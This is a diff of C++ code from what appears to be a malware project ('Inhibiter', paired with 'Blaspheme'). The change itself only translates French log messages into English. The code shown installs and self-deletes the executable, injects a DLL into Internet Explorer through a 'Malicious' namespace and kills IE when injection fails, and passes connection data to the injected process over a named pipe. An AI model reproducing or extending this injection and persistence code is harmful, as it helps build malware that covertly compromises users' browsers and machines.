@@ -32,14 +32,14 @@ namespace Inhibiter
         // par défaut, si il existe déja un exécutale de l'injecteur, celui-ci est directement remplacé.
         if(CopyFile(current_executable_path.c_str(), executable_path.c_str(), FALSE) == FALSE)
         {
-            LOG << "Error code : " + to_string(GetLastError());
-            FATAL_ERROR("Impossible de copier l'executable dans le repertoire d'installation.");
+            LOG << "CopyFile failed : " + to_string(GetLastError());
+            FATAL_ERROR("Unable to install injector");
         }
 
 		System::Process finish_install(executable_path, "\"" + current_executable_path + "\"");
         if(!finish_install.isRunning())
         {
-            FATAL_ERROR("Impossible de lancer l'injecteur.");
+            FATAL_ERROR("Unable to launch injector");
         }
     }
 
@@ -49,7 +49,7 @@ namespace Inhibiter
         // efface la DLL d'inhibition
         if(!DeleteFile(dll_path.c_str()))
         {
-            FATAL_ERROR("Impossible d'effacer l'ancienne DLL, elle est injectee et en execution");
+            FATAL_ERROR("Unable to delete substrate");
         }
 
         // cet executable doit s'auto-effacer pour terminer la désinstallation
@@ -58,11 +58,11 @@ namespace Inhibiter
     void InhibiterCore::finishUninstall()
     {
         FUNC_LOG(__FUNCTION__);
-        LOG << "Executable temporaire, effacement de l'executable installe.";
+        LOG << "Temporary exe, deleting injector";
         if(!DeleteFile(executable_path.c_str()))
         {
-            LOG << "Error code : " + to_string(GetLastError());
-            FATAL_ERROR("Impossible d'effacer l'executable lors de l'installation");
+            LOG << "DeleteFile failed : " + to_string(GetLastError());
+            FATAL_ERROR("Unable to delete injector");
         }
     }
 
@@ -107,12 +107,12 @@ namespace Inhibiter
         }
 
 		Malicious::InternetExplorer ie;
-        LOG << "Injection...";
+        LOG << "Injecting IE";
 
 		if(!Malicious::inject(ie.getPid(), dll_path))
         //if(!Malicious::inject(injected_process.getPid(), "dll.dll"))
         {
-            LOG << "Echec de l'injection. Kill du processus.";
+            LOG << "Injection failed, killing IE";
 			ie.kill();
         }
         else
@@ -141,10 +141,10 @@ namespace Inhibiter
             Network::Pipe pipe_server;
 
             pipe_server.listen(PIPE_NAME);
-            LOG << "Serveur pipe en ecoute...";
+            LOG << "Pipe server waiting for connection";
             if(pipe_server.accept())
             {
-                LOG << "Envoi des informations de connexion : "+string(blaspheme, Blaspheme::DEFAULT_STR_SIZE);
+                LOG << "Sending connection informations : "+string(blaspheme, Blaspheme::DEFAULT_STR_SIZE);
                 //pipe_server.send(buffer.c_str(), buffer.size());
 				pipe_server.send(blaspheme, Blaspheme::DEFAULT_STR_SIZE);
             }
